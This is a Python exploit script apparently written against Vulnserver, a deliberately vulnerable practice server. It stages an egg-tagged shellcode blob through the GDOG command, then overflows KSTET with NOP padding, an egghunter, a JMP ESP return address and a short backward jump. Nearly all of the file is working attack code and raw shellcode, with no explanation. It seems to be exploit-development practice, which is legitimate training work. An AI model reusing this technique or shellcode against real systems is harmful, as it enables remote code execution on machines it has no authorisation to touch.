import sys
import socket


# Fuzzing/poc vulnserver

evilString = "A" * 256

#cyclic_pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A"
#shellcode = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"
#shellcode = "w00tw00t" + "A"*1000


#625011AF
JMP_ESP = "\xaf\x11\x50\x62"
#EBB8
JMP_70_BACK = "\xEB\xB8" # Nasm Shell

egghunter = b""
egghunter += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd"
egghunter += b"\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74"
egghunter += b"\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

shellcode =  b""
shellcode += b"\xb8\x76\x81\x8e\x81\xda\xdc\xd9\x74\x24\xf4"
shellcode += b"\x5b\x29\xc9\xb1\x59\x31\x43\x14\x83\xeb\xfc"
shellcode += b"\x03\x43\x10\x94\x74\x72\x69\xd7\x77\x8b\x6a"
shellcode += b"\x87\x46\x59\xe3\xa2\xcd\xd6\xa6\x1c\x85\xbb"
shellcode += b"\x4a\xd7\xcb\x2f\xd8\x95\xc3\x7e\x21\x56\xa3"
shellcode += b"\xcb\xfb\x59\x0b\x67\x3f\xf8\xf7\x7a\x6c\xda"
shellcode += b"\xc6\xb4\x61\x1b\x0e\x03\x0f\xf4\xc2\x1f\xbd"
shellcode += b"\x1a\x68\x5d\x7e\x4d\x6f\xb2\xf5\x31\x17\xb7"
shellcode += b"\xca\xc5\xab\xb6\x1a\x75\xbf\xe1\xba\xfe\xf7"
shellcode += b"\x09\xba\xd3\x8d\xe3\xc8\xef\xc4\xc2\xcf\x84"
shellcode += b"\xe3\xaf\x31\x4c\x3a\x70\xf0\xbf\x30\xdc\xf2"
shellcode += b"\xf8\x73\xfc\x80\xf2\x87\x81\x92\xc1\xfa\x5d"
shellcode += b"\x16\xd5\x5d\x15\x80\x31\x5f\xfa\x57\xb2\x53"
shellcode += b"\xb7\x1c\x9c\x77\x46\xf0\x97\x8c\xc3\xf7\x77"
shellcode += b"\x05\x97\xd3\x53\x4d\x43\x7d\xc2\x2b\x22\x82"
shellcode += b"\x14\x93\x9b\x26\x5f\x36\xcd\x57\xa0\xc8\xf2"
shellcode += b"\x05\x36\x04\x3f\xb6\xc6\x02\x48\xc5\xf4\x8d"
shellcode += b"\xe2\x41\xb4\x46\x2d\x95\xcd\x41\xce\x49\x75"
shellcode += b"\x01\x30\x6a\x85\x0b\xf7\x3e\xd5\x23\xde\x3e"
shellcode += b"\xbe\xb3\xdf\xea\x2a\xbe\x77\x1f\xaa\xbc\x88"
shellcode += b"\x77\xa8\xc0\xb5\xae\x25\x26\xe9\xe0\x65\xf7"
shellcode += b"\x4a\x51\xc5\xa7\x22\xbb\xca\x98\x53\xc4\x01"
shellcode += b"\xb1\xfe\x2b\xff\xe9\x96\xd2\x5a\x61\x06\x1a"
shellcode += b"\x71\x0f\x08\x90\x73\xef\xc7\x51\xf6\xe3\x30"
shellcode += b"\x06\xf8\xfb\xc0\xa3\xf8\x91\xc4\x65\xaf\x0d"
shellcode += b"\xc7\x50\x87\x91\x38\xb7\x94\xd6\xc7\x46\xac"
shellcode += b"\xad\xfe\xdc\x90\xd9\xfe\x30\x10\x1a\xa9\x5a"
shellcode += b"\x10\x72\x0d\x3f\x43\x67\x52\xea\xf0\x34\xc7"
shellcode += b"\x15\xa0\xe9\x40\x7e\x4e\xd7\xa7\x21\xb1\x32"
shellcode += b"\xb4\x26\x4d\xc0\x93\x8e\x25\x3a\xa4\x2e\xb5"
shellcode += b"\x50\x24\x7f\xdd\xaf\x0b\x70\x2d\x4f\x86\xd9"
shellcode += b"\x25\xda\x47\xab\xd4\xdb\x4d\x6d\x48\xdb\x62"
shellcode += b"\xb6\x7b\xa6\x0b\x49\x7c\x57\x02\x2e\x7d\x57"
shellcode += b"\x2a\x50\x42\x81\x13\x26\x85\x11\x20\x39\xb0"
shellcode += b"\x34\x01\xd0\xba\x6b\x51\xf1"

shellcode = "w00tw00t" + shellcode

#TestCommitPayload

#evilString = cyclic_pattern
#evilString = "A"*70 + JMP_ESP + JMP_70_BACK + "C"*(256-4-7-4)
evilString = "\x90"*18 + egghunter + "\x90"*20 + JMP_ESP + JMP_70_BACK + "C"*(256-18-32-20-4-4)


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

command2 = "GDOG" + shellcode

s.connect(('xxx.xxx.xxx.xxx', 9999))
s.recv(1024)
s.send(command2)
s.close()

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

command = "KSTET " + evilString

s.connect(('xxx.xxx.xxx.xxx', 9999))
s.recv(1024)
s.send(command)
s.close()
